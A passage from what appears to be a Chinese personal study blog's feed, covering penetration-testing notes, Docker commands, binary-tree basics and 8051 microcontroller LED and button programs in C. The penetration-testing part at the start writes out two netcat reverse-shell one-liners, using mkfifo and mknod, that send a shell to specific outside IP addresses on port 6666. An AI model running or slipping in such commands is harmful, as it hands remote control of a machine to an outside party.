</p><p>被控端使用nc将&#x2F;bin&#x2F;sh发送到控制端的6666端口，控制端只需要监听本地的6666端口，即可获得shell。</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826111624663.png" alt="image-20230826111624663"></p><p>无e参数，反弹shell,有些情况下nc 指令没有-e的参数，就是用下面的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 139.155.49.43 6666 &gt;/tmp/f<br></code></pre></td></tr></table></figure><blockquote><p>  mkﬁfo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给&#x2F;bin&#x2F;sh，sh会执行管道里的  命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路。  </p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mknod backpipe p; nc 47.101.214.85 6666 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker的使用</title>
    <link href="/2023/08/19/others/docker%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/08/19/others/docker%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="docker的使用"><a href="#docker的使用" class="headerlink" title="docker的使用"></a>docker的使用</h1><h2 id="Docker镜像操作"><a href="#Docker镜像操作" class="headerlink" title="Docker镜像操作"></a>Docker镜像操作</h2><ol><li><p>列出镜像</p><blockquote><p>docker image ls -a</p></blockquote></li><li><p>拉取镜像</p><blockquote><p>docker image pull  镜像名称&#x2F;仓库的位置</p></blockquote><p>docker官方提供的image文件存在Library组里面，所以拉取u这个仓库的镜像的时候可以不用管仓库名称</p></li><li><p>删除镜像</p><blockquote><p>docker image rm 镜像名称或者镜像的id</p><p>docker rmi 镜像的名称或者id</p></blockquote><p>注意当有容器在使用镜像的时候应该先删除容器，使用包括，正在运行的容器或者stop的容器</p></li></ol><h2 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h2><ol><li><p>创建容器</p><blockquote><p>docker run [option]  镜像名   向容器传入的命令（一般出入&#x2F;bin&#x2F;bash）</p></blockquote><blockquote><p>-i 表示以“交互模式”运行容器<br>-t 表示容器启动后会进入其命令行。加入这两个参数后，容器创建就能登录进去。即 分配一个伪终端。<br>–name 为创建的容器命名<br>-v 表示目录映射关系(前者是宿主机目录，后者是映射到宿主机上的目录，即 宿主机目录:容器中目录)，可<br>以使 用多个-v 做多个目录或文件映射。注意:最好做目录映射，在宿主机上做修改，然后 共享到容器上。<br>-d 在run后面加上-d参数,则会创建一个守护式容器在后台运行(这样创建容器后不 会自动登录容器，如果只加-i -t 两个参数，创建后就会自动进去容器)。<br>-p 表示端口映射，前者是宿主机端口，后者是容器内的映射端口。可以使用多个-p 做多个端口映射<br>-e 为容器设置环境变量<br>–network&#x3D;host 表示将主机的网络环境映射到容器中，容器的网络与主机相同</p></blockquote><ul><li><p>创建一个交互式的容器</p><p>我们需要在创建的时候附加上it</p></li><li><p>创建一个守护式容器</p><p>守护式的容器，在容器内部exit但是容器不会stop，如果需要一个长时间运行的容器可以使用这个</p><blockquote><p>docker run -dit –name&#x3D;test centos</p></blockquote><p>创建一个名为test 的容器，使用的镜像是centos，这样运行可以帮助pull镜像，但是还是手动pull好一点</p></li></ul></li><li><p>进入运行的容器</p></li></ol><blockquote><p>docker exet -it 容器的名称 传入的命令</p></blockquote><ol start="3"><li><p>查看容器</p><blockquote><p>docker ps (-a)</p></blockquote></li><li><p>停止与启动容器</p><ul><li><p>停止</p><blockquote><p>docker stop 容器名称或者id</p></blockquote></li><li><p>关闭</p><blockquote><p>docker  kill 容器名称或者id</p></blockquote></li><li><p>启动</p><blockquote><p>docker start 容器名称或者id</p></blockquote></li></ul></li><li><p>删除容器</p><blockquote><p>docker rm 容器的名称和id</p></blockquote></li></ol><h2 id="制作镜像"><a href="#制作镜像" class="headerlink" title="制作镜像"></a>制作镜像</h2><ol><li><p>保存容器为镜像</p><blockquote><p>docker commit mycentos3 mycentos3</p></blockquote></li></ol><h2 id="容器备份和迁移"><a href="#容器备份和迁移" class="headerlink" title="容器备份和迁移"></a>容器备份和迁移</h2><blockquote><p> # docker save -o 保存的文件名 镜像名</p><p>docker save -o .&#x2F;mycentos3.tar mycentos3</p></blockquote><ul><li><p>将镜像文件加载到本地</p><blockquote><p>docker load -i .&#x2F;centos.tar</p></blockquote></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二叉树与并查集</title>
    <link href="/2023/08/19/%E7%AE%97%E6%B3%95/learn/%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%8E%E5%B9%B6%E6%9F%A5%E9%9B%86/"/>
    <url>/2023/08/19/%E7%AE%97%E6%B3%95/learn/%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%8E%E5%B9%B6%E6%9F%A5%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="二叉树与并查集"><a href="#二叉树与并查集" class="headerlink" title="二叉树与并查集"></a>二叉树与并查集</h1><h2 id="树的基本概念"><a href="#树的基本概念" class="headerlink" title="树的基本概念"></a>树的基本概念</h2><p>可见于数据结构和算法的笔记，更加详细</p><ol><li>空树</li><li>树的特性<ul><li>任意一个树的两个节点，有且只有一条边</li><li>一个节点数为n的树，边的数量是n-1</li><li>任意一个数加一条边就会变成图，也就是有回路</li></ul></li></ol><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><ol><li><p>二叉树是有序树</p></li><li><p>斜树</p><p>全是右子树或者左子树</p></li><li><p>满二叉树</p><p>叶子全部出现最底层</p></li><li><p>完成二叉树</p><p>底层可以不完全存在，但是需要优先左子树</p></li><li><p>第i 层具有2^1-1^个节点</p></li><li><p>深度为k的树，最多有2^k^-1个节点，</p></li><li><p>度为2的节点数为n，那么叶子节点而数量是2*n</p></li><li><p>在完全二叉树中，如果一共有n个节点，那么右[log2 n]+1的层，[log2 n]是向下取整</p></li><li><p>遍历</p><ul><li>前序：根，左，右</li><li>中序：左，根，右</li><li>后序：左，右，根</li></ul></li></ol><h2 id="并查集"><a href="#并查集" class="headerlink" title="并查集"></a>并查集</h2><p>1. </p>]]></content>
    
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>51MCN</title>
    <link href="/2023/08/10/%E5%B5%8C%E5%85%A5%E5%BC%8F/51MCN/"/>
    <url>/2023/08/10/%E5%B5%8C%E5%85%A5%E5%BC%8F/51MCN/</url>
    
    <content type="html"><![CDATA[<h1 id="51单片机"><a href="#51单片机" class="headerlink" title="51单片机"></a>51单片机</h1><h2 id="51里的最小的系统"><a href="#51里的最小的系统" class="headerlink" title="51里的最小的系统"></a>51里的最小的系统</h2><h3 id="晶振电路"><a href="#晶振电路" class="headerlink" title="晶振电路"></a>晶振电路</h3><h2 id="点亮LED灯"><a href="#点亮LED灯" class="headerlink" title="点亮LED灯"></a>点亮LED灯</h2><p>p2默认全是高电频</p><h3 id="GPIO"><a href="#GPIO" class="headerlink" title="GPIO"></a>GPIO</h3><p>是通用的输入，输出设备</p><h3 id="点亮第一个灯的程序"><a href="#点亮第一个灯的程序" class="headerlink" title="点亮第一个灯的程序"></a>点亮第一个灯的程序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;reg52.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> u8;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> u16;<br><br>sbit LED1 = P2;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delay_10us</span><span class="hljs-params">(u16 ten_us)</span><br>&#123; <span class="hljs-comment">//当传入1 的时候，大约延迟10us</span><br>    <span class="hljs-comment">//不精确的延时</span><br>    <span class="hljs-keyword">while</span> (ten_us--) &#123;&#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        LED1 = <span class="hljs-number">0</span>; <span class="hljs-comment">//点亮</span><br>        delay_10us(<span class="hljs-number">50000</span>);<br>        LED1 = <span class="hljs-number">1</span>;<span class="hljs-comment">//熄灭</span><br>        delay_10us(<span class="hljs-number">50000</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="流水灯"><a href="#流水灯" class="headerlink" title="流水灯"></a>流水灯</h3><ol><li><p>基于位运算实现流水灯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;reg52.h&gt;</span></span><br>   <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> u8;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> u16;<br>   <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LED_PORT P2  </span><br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">delay_10us</span><span class="hljs-params">(u16 ten_us)</span><br>&#123; <span class="hljs-comment">//当传入1 的时候，大约延迟10us</span><br>    <span class="hljs-comment">//不精确的延时</span><br>    <span class="hljs-keyword">while</span> (ten_us--) &#123;&#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    u8 i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) <br>    &#123;<br>   <br>   <br>        LED_PORT= <span class="hljs-number">0x00</span>;<br>        delay_10us(<span class="hljs-number">100000</span>);<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)<br>        &#123;<br>            LED_PORT=~(<span class="hljs-number">0x01</span>&lt;&lt;i);    <br>            delay_10us(<span class="hljs-number">50000</span>);<br>        &#125;<br>   <br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>使用库函数进行左右移动</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;reg52.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;intrins.h&gt;</span>  <span class="hljs-comment">//左移右移的头文件</span></span><br>   <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> u8;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> u16;<br>   <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LED_PORT P2</span><br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">delay_10us</span><span class="hljs-params">(u16 ten_us)</span><br>&#123; <span class="hljs-comment">//当传入1 的时候，大约延迟10us</span><br>    <span class="hljs-comment">//不精确的延时</span><br>    <span class="hljs-keyword">while</span> (ten_us--) &#123;&#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    u8 i     = <span class="hljs-number">0</span>;<br>    LED_PORT = <span class="hljs-number">0x00</span>;<br>    delay_10us(<span class="hljs-number">100000</span>);<br>    LED_PORT = <span class="hljs-number">0x01</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">7</span>; i++) &#123;<br>            LED_PORT = _crol_(LED_PORT, <span class="hljs-number">1</span>);  <span class="hljs-comment">//往左移</span><br>            delay_10us(<span class="hljs-number">50000</span>);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">7</span>; i++) &#123;<br>            LED_PORT = _cror_(LED_PORT, <span class="hljs-number">1</span>);  <span class="hljs-comment">//往右移</span><br>            delay_10us(<span class="hljs-number">50000</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>使用独立的按键控制灯的亮灭</p><p>我们控制专门的一盏灯，使用头文件REGX52.H控制每位寄存器的方式</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/qt1/image-20230813080613733.png" alt="image-20230813080613733"></p><p>下面是代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;REGX52.H&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;intrins.h&gt;</span></span><br>   <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> u8;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LED_PORT P2</span><br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">Delay500ms</span><span class="hljs-params">()</span> <span class="hljs-comment">//@11.0592MHz</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data i, j, k;<br>   <br>    _nop_();<br>    _nop_();<br>    i = <span class="hljs-number">22</span>;<br>    j = <span class="hljs-number">3</span>;<br>    k = <span class="hljs-number">227</span>;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">while</span> (--k)<br>                ;<br>        &#125; <span class="hljs-keyword">while</span> (--j);<br>    &#125; <span class="hljs-keyword">while</span> (--i);<br>&#125;<br>   <br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">Delay250ms</span><span class="hljs-params">()</span><span class="hljs-comment">//@11.0592MHz</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data i, j, k;<br>   <br>    _nop_();<br>    _nop_();<br>    i = <span class="hljs-number">11</span>;<br>    j = <span class="hljs-number">130</span>;<br>    k = <span class="hljs-number">111</span>;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            <span class="hljs-keyword">while</span> (--k);<br>        &#125; <span class="hljs-keyword">while</span> (--j);<br>    &#125; <span class="hljs-keyword">while</span> (--i);<br>&#125;<br>   <br>   <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    u8 i = <span class="hljs-number">0</span>;<br>   <br>    P2 = <span class="hljs-number">0xFF</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">if</span> (P3_1 == <span class="hljs-number">0</span>) &#123;<br>            P2_0 = <span class="hljs-number">0</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            P2_0 = <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>   <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>跳过单次按键的周期（按一次改变一次灯）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;REGX52.H&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;intrins.h&gt;</span></span><br>   <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> u16;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> u8;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LED_PORT P2</span><br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">Delay</span><span class="hljs-params">(u16 xms)</span> <span class="hljs-comment">//@11.0592MHz</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data i, j;<br>    <span class="hljs-keyword">while</span> (xms--) &#123;<br>        _nop_();<br>        i = <span class="hljs-number">2</span>;<br>        j = <span class="hljs-number">199</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">while</span> (--j)<br>                ;<br>        &#125; <span class="hljs-keyword">while</span> (--i);<br>    &#125;<br>&#125;<br>   <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    u8 i = <span class="hljs-number">0</span>;<br>    P2   = <span class="hljs-number">0x0F</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">if</span> (P3_1 == <span class="hljs-number">0</span>) &#123;<br>            Delay(<span class="hljs-number">20</span>);<span class="hljs-comment">//begin</span><br>            <span class="hljs-keyword">while</span> (P3_1 == <span class="hljs-number">0</span>);<br>            Delay(<span class="hljs-number">20</span>);<span class="hljs-comment">//end   这个部分是一个按键检查的周期</span><br>            <br>            <br>            P2 = ~P2;<br>        &#125;<br>    &#125;<br>   <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>独立按键控制灯的移位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;REGX52.H&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;intrins.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LED_PORT P2</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> u16;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> u8;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> u4;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Delay</span><span class="hljs-params">(u16 xms)</span> <span class="hljs-comment">//@11.0592MHz</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data i, j;<br>    <span class="hljs-keyword">while</span> (xms--) &#123;<br>        _nop_();<br>        i = <span class="hljs-number">2</span>;<br>        j = <span class="hljs-number">199</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">while</span> (--j)<br>                ;<br>        &#125; <span class="hljs-keyword">while</span> (--i);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    u8 i = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> LEDNum;<br><br>    P2 = <span class="hljs-number">0x00</span>;<br>    Delay(<span class="hljs-number">500</span>);<br>    P2 = <span class="hljs-number">0xFE</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <br>        <span class="hljs-comment">//往右移</span><br>        <span class="hljs-keyword">if</span> (P3_1 == <span class="hljs-number">0</span>) &#123;<br>            Delay(<span class="hljs-number">20</span>);<br>            <span class="hljs-keyword">while</span> (P3_1 == <span class="hljs-number">0</span>)<br>                ;<br>            Delay(<span class="hljs-number">20</span>);<br><br>            P2 = _cror_(P2, <span class="hljs-number">1</span>);<br>        &#125;<br>        <br>        <span class="hljs-comment">//往左移</span><br>        <span class="hljs-keyword">if</span> (P3_3 == <span class="hljs-number">0</span>) &#123;<br>            Delay(<span class="hljs-number">20</span>);<br>            <span class="hljs-keyword">while</span> (P3_3 == <span class="hljs-number">0</span>)<br>                ;<br>            Delay(<span class="hljs-number">20</span>);<br><br>            P2 = _crol_(P2, <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>总结，下面的代码是运用上面的知识写出来的按键灯光秀</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;REGX52.H&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;intrins.h&gt;</span></span><br>   <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LED_PORT P2</span><br>   <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> u16;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> u8;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> u4;<br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">Delay</span><span class="hljs-params">(u16 xms)</span> <span class="hljs-comment">//@11.0592MHz</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data i, j;<br>    <span class="hljs-keyword">while</span> (xms--) &#123;<br>        _nop_();<br>        i = <span class="hljs-number">2</span>;<br>        j = <span class="hljs-number">199</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">while</span> (--j)<br>                ;<br>        &#125; <span class="hljs-keyword">while</span> (--i);<br>    &#125;<br>&#125;<br>   <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    u8 i = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> LEDNum;<br>   <br>    P2 = <span class="hljs-number">0x00</span>;<br>    Delay(<span 